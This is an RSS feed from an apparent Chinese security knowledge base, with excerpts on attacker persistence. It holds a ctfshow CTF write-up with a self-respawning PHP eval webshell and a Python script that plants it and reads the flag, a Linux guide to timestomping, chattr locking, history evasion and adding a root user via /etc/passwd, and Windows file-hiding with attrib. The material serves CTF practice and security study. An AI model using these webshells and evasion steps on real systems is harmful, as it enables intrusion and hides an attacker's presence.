<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>权限维持 on mrlxl的知识库</title>
    <link>https://luoshine99-gif.github.io/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</link>
    <description>Recent content in 权限维持 on mrlxl的知识库</description>
    <generator>Hugo</generator>
    <language>en-US</language>
    <lastBuildDate>Thu, 11 Dec 2025 00:00:00 +0800</lastBuildDate>
    <atom:link href="https://luoshine99-gif.github.io/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>ctfshow-权限维持</title>
      <link>https://luoshine99-gif.github.io/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/ctfshow-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</link>
      <pubDate>Thu, 11 Dec 2025 00:00:00 +0800</pubDate>
      <guid>https://luoshine99-gif.github.io/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/ctfshow-%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</guid>
      <description>&lt;h1 id=&#34;ctfshow-权限维持&#34;&gt;ctfshow-权限维持&lt;/h1&gt;&#xA;&lt;h3 id=&#34;web670&#34;&gt;web670&lt;/h3&gt;&#xA;&lt;p&gt;这里的check貌似是删web根目录文件，那么可以用awd的常规思路，写一个不死马：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;GET&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;action&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;cmd&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;POST&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;cmd&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;file_put_contents&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;a.php&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s1&#34;&gt;&amp;#39;&amp;lt;?php ignore_user_abort(true);set_time_limit(0);unlink(__FILE__);$file = \&amp;#39;shell.php\&amp;#39;;$code = \&amp;#39;&amp;lt;?php @eval($_POST[1]);?&amp;gt;\&amp;#39;;while (1) {file_put_contents($file, $code);usleep(5000);}?&amp;gt;&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;访问不死马使其解析，将木马写入内存&lt;/p&gt;&#xA;&lt;p&gt;然后申请check，再连接shell.php即可：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241125175540663-1059963057.png&#34; alt=&#34;image-20241125175540487&#34;&gt;&lt;/p&gt;&#xA;&lt;h3 id=&#34;web671&#34;&gt;web671&lt;/h3&gt;&#xA;&lt;p&gt;同样写不死马即可，flag在根目录：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241125180133066-1725898859.png&#34; alt=&#34;image-20241125180132877&#34;&gt;&lt;/p&gt;&#xA;&lt;h3 id=&#34;web672&#34;&gt;web672&lt;/h3&gt;&#xA;&lt;p&gt;同理：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241125180627560-549666934.png&#34; alt=&#34;image-20241125180627088&#34;&gt;&lt;/p&gt;&#xA;&lt;h3 id=&#34;web673&#34;&gt;web673&lt;/h3&gt;&#xA;&lt;p&gt;同理。。&lt;/p&gt;&#xA;&lt;p&gt;既然不死马一直能打，那我们可以尝试构造一个python脚本：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;requests&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://ed21030c-afd5-4efd-a3c6-d6728eef56f5.challenge.ctf.show/&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;data1&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;cmd&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;file_put_contents(&amp;#39;a.php&amp;#39;,&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;lt;?php ignore_user_abort(true);set_time_limit(0);unlink(__FILE__);&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;$file = &amp;#39;shell.php&amp;#39;;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;$code = &amp;#39;&amp;lt;?php @eval(&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;$_POST[1]);?&amp;gt;&amp;#39;;while (1) {file_put_contents(&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;$file, &lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;$code);usleep(5000);}?&amp;gt;&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;);&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;post&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;?action=cmd&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;try&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;a.php&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;timeout&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;))&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;except&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;?action=check&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;n&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;requests&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;post&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;url&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;shell.php&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;data&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;1&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;system(&amp;#34;cat /f*&amp;#34;);&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;})&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;   &lt;span class=&#34;nb&#34;&gt;print&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;text&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;一跑即出：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241125182123450-1052963366.png&#34; alt=&#34;image-20241125182123187&#34;&gt;&lt;/p&gt;&#xA;&lt;h3 id=&#34;web674-676&#34;&gt;web674-676&lt;/h3&gt;&#xA;&lt;p&gt;同理，脚本跑即可&lt;/p&gt;&#xA;&lt;h3 id=&#34;web677&#34;&gt;web677&lt;/h3&gt;&#xA;&lt;p&gt;除了tmp目录都没有写权限&lt;/p&gt;&#xA;&lt;p&gt;这里同样可以用加载进程的思维：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;GET:?action=cmd&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;POST:cmd=system(&amp;#39;sleep 10;cat /f*&amp;#39;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;执行后会加载十秒，在此期间，另开一个页面来启动check，即可cat到flag：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241125203947992-1056072447.png&#34; alt=&#34;image-20241125203945891&#34;&gt;&lt;/p&gt;&#xA;&lt;h3 id=&#34;web678&#34;&gt;web678&lt;/h3&gt;&#xA;&lt;blockquote&gt;&#xA;&lt;p&gt;&lt;strong&gt;check后，会停止一切web服务，包括nginx php-fpm&lt;/strong&gt; &lt;strong&gt;天地同寿的打法，你能应付吗&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;/blockquote&gt;&#xA;&lt;p&gt;tmp目录可写，那么就在这个目录上做文章&lt;/p&gt;&#xA;&lt;p&gt;中间件都没了，那就用php直接在/tmp起一个服务，就能解析tmp中的php文件了&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;tmp目录下生成木马文件:&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cmd=system(&amp;#39;cd /tmp;echo &amp;#34;&amp;lt;?php eval(\$_POST[1]);?&amp;gt;&amp;#34; &amp;gt; index.php&amp;#39;);&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;开启web服务：&lt;/p&gt;</description>
    </item>
    <item>
      <title>linux权限维持</title>
      <link>https://luoshine99-gif.github.io/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</link>
      <pubDate>Thu, 11 Dec 2025 00:00:00 +0800</pubDate>
      <guid>https://luoshine99-gif.github.io/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</guid>
      <description>&lt;h1 id=&#34;linux权限维持&#34;&gt;linux权限维持&lt;/h1&gt;&#xA;&lt;h3 id=&#34;修改文件终端属性&#34;&gt;修改文件、终端属性&lt;/h3&gt;&#xA;&lt;h4 id=&#34;文件创建时间&#34;&gt;文件创建时间&lt;/h4&gt;&#xA;&lt;p&gt;有时我们会根据文件修改时间来判断文件是否为后门，比如对比shell.php和index.php的修改时间是否相差过大&lt;/p&gt;&#xA;&lt;p&gt;touch命令用于修改文件或者目录的时间属性，可以使用touch修改文件创建时间：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;touch -r index.php shell.php&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# 将shell.php的修改时间改为和index.php一致&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241126212025017-463283678.png&#34; alt=&#34;image-20241126212023666&#34;&gt;&lt;/p&gt;&#xA;&lt;h4 id=&#34;文件锁定&#34;&gt;文件锁定&lt;/h4&gt;&#xA;&lt;p&gt;在Linux中，使用chattr命令来防止root和其他管理用户误删除和修改重要文件及目录，而此权限用ls -l是查看不出来的，从而达到隐藏权限的目的：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;chattr +i evil.php  &lt;span class=&#34;c1&#34;&gt;#锁定文件&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;rm -rf evil.php     &lt;span class=&#34;c1&#34;&gt;#直接删除会提示禁止删除&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;lsattr  evil.php    &lt;span class=&#34;c1&#34;&gt;#属性查看&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;chattr -i evil.php  &lt;span class=&#34;c1&#34;&gt;#解除锁定&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;rm -rf evil.php     &lt;span class=&#34;c1&#34;&gt;#此时才可以正常删除文件&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241126212502426-793342345.png&#34; alt=&#34;image-20241126212501296&#34;&gt;&lt;/p&gt;&#xA;&lt;h4 id=&#34;历史操作命令&#34;&gt;历史操作命令&lt;/h4&gt;&#xA;&lt;p&gt;我们可能想不让在shell中执行的命令被记录在命令行历史中，但单纯的&lt;code&gt;history -c  &lt;/code&gt;只能清除全部命令记录，可以尝试下面的方法&lt;/p&gt;&#xA;&lt;h5 id=&#34;针对你的工作关闭历史记录&#34;&gt;针对你的工作关闭历史记录&lt;/h5&gt;&#xA;&lt;p&gt;可以临时禁用历史功能，这意味着在这命令之后执行的所有操作都不会记录到历史中，然而这个命令之前的所有东西都会原样记录在历史列表中：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;space&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; +o &lt;span class=&#34;nb&#34;&gt;history&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#[space] 表示空格。并且由于空格的缘故，该命令本身也不会被记录&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;执行了目标命令后记得恢复：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Space&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; -o &lt;span class=&#34;nb&#34;&gt;history&lt;/span&gt;  &#xA;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#将环境恢复原状&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;可以看看下面这个情况：&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241126213948268-983788722.png&#34; alt=&#34;image-20241126213946978&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;上图利用这个方法使&lt;code&gt;echo 2nd&lt;/code&gt;的命令记录没有被存储在history中&lt;/p&gt;&#xA;&lt;h5 id=&#34;历史记录中删除指定的命令&#34;&gt;历史记录中删除指定的命令&lt;/h5&gt;&#xA;&lt;p&gt;如果目标命令已经存在于历史，可以对其进行删除：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;找到想要删除的关键命令：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;history&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep &lt;span class=&#34;s2&#34;&gt;&amp;#34;keyword&amp;#34;&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241126214457282-2004294411.png&#34; alt=&#34;image-20241126214456252&#34;&gt;&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;上面查询得到了对应命令记录的id，接下来进行删除：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;history&lt;/span&gt; -d &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;num&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241126214958158-1537806554.png&#34; alt=&#34;image-20241126214956966&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;虽然这样删除了历史记录，但我上面执行的命令也被记录了，所以我个人认为上面关闭历史记录的方法更有效&lt;/p&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h3 id=&#34;添加用户&#34;&gt;添加用户&lt;/h3&gt;&#xA;&lt;p&gt;默认已经提升至root权限&lt;/p&gt;&#xA;&lt;h4 id=&#34;passwd写入&#34;&gt;passwd写入&lt;/h4&gt;&#xA;&lt;p&gt;root权限时，我们可以直接通过写入passwd文件进行用户写入&lt;/p&gt;&#xA;&lt;p&gt;/etc/passwd 各部分含义：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;⽤户名：密码：⽤户ID：组ID：身份描述：⽤户的家⽬录：⽤户登录后所使⽤的SHELL&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/3450279-20241126223642368-1367413835.png&#34; alt=&#34;image-20241126223641041&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;可以根据这个格式增加超级用户：&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&#xA;&lt;p&gt;首先构造一个Yuy0ung用户的身份信息：&lt;/p&gt;</description>
    </item>
    <item>
      <title>windows权限维持</title>
      <link>https://luoshine99-gif.github.io/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</link>
      <pubDate>Thu, 11 Dec 2025 00:00:00 +0800</pubDate>
      <guid>https://luoshine99-gif.github.io/My-Knowlege-Database/blog/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</guid>
      <description>&lt;h1 id=&#34;windows权限维持&#34;&gt;windows权限维持&lt;/h1&gt;&#xA;&lt;p&gt;最主要就是想一些办法让我们的后门能够自主执行从而让我们一直拥有目标主机的权限，很多操作也类似于权限提升&lt;/p&gt;&#xA;&lt;h3 id=&#34;文件特性&#34;&gt;文件特性&lt;/h3&gt;&#xA;&lt;p&gt;和linux一样，文件层面上看，有一些隐藏文件的方法&lt;/p&gt;&#xA;&lt;h4 id=&#34;attrib&#34;&gt;attrib&lt;/h4&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;attrib +s +a +h +r c:\test&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;s：设置系统属性（System） a：设置存档属性（Archive） h：设置隐藏属性（Hidden）&lt;/p&gt;&#xA;&lt;p&gt;r：设置只读属性（Read-only）&lt;/p&gt;&#xA;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20241214202221388.png&#34; alt=&#34;image-20241214202221388&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;如此即可进行隐藏&lt;/p&gt;&#xA;&lt;p&gt;如果要查看，需要加上&lt;code&gt;/a&lt;/code&gt;参数：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;dir&lt;/span&gt; /a&#xA;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://yuy0ung.oss-cn-chengdu.aliyuncs.com/image-20241214202400912.png&#34; alt=&#34;image-20241214202400912&#34;&gt;&lt;/p&gt;&#xA;&lt;p&gt;当然，删除对应属性也能重新显示出来：&lt;/p&gt;&#xA;&lt;div class=&#34;highlight&#34;&gt;&lt;pre 